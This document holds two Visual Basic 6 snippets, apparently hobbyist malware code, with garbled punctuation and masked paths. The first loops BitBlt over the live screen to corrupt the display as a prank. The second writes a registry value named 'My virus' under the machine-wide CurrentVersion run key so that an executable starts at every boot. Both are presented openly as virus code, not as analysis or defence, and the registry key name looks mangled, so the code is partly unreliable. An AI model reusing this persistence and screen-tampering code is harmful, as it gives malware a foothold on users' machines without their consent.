
Private Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long Private Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Long* ByVal X As Long* ByVal Y As Long* ByVal nWidth As Long* ByVal nHeight As Long* ByVal hSrcDC As Long* ByVal xSrc As Long* ByVal ySrc As Long* ByVal dwRop As Long) As Long Private Sub Form_KeyDown(KeyCode As Integer* Shift As Integer) If KeyCode = vbKeyEscape Then Unload Me End Sub Private Sub Form_Load() Dim lngDC As Long Dim intWidth As Integer* intHeight As Integer Dim intX As Integer* intY As Integer lngDC = GetDC(0) intWidth = Screen.Width / Screen.TwipsPerPixelX intHeight = Screen.Height / Screen.TwipsPerPixelY form1.Width = intWidth * 15 form1.Height = intHeight * 15 Call BitBlt(hDC* 0* 0* intWidth* intHeight* lngDC* 0* 0* vbSrcCopy) form1.Visible = vbTrue Do intX = (intWidth - 128) * Rnd intY = (intHeight - 128) * Rnd Call BitBlt(lngDC* intX* intY + 1* 128* 128* lngDC* intX* intY* vbSrcCopy) DoEvents Loop End Sub Private Sub Form_Unload(Cancel As Integer) Set form1 = Nothing End End Sub

Option Explicit

Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, ByVal lpData As String, lpcbData As Long) As Long

Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long

Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long

Private Declare Function RegDeleteKey Lib "advapi32.dll" Alias "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey As String) As Long

Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long

Private Const REG_SZ = 1

Private Const LOCALMACHINE = &H80000002

Private Sub Command1_Click()

Dim InputValue As String

Dim nBufferKey As Long, nBufferSubKey As Long

RegCreateKey LOCALMACHINE, "SOFTWARE\JPRODUCTIONS", nBufferKey

RegOpenKey LOCALMACHINE, "Software\Microsoft\******s\CurrentVersion", nBufferKey

RegOpenKey nBufferKey, "Run-", nBufferSubKey

InputValue = "c:\******s\system\Project12.exe"

RegOpenKey LOCALMACHINE, "Software\Microsoft\******s\CurrentVersion", nBufferKey

RegOpenKey nBufferKey, "Run-", nBufferSubKey

RegSetValueEx nBufferSubKey, "My virus", 0, REG_SZ, InputValue, Len(InputValue)

End Sub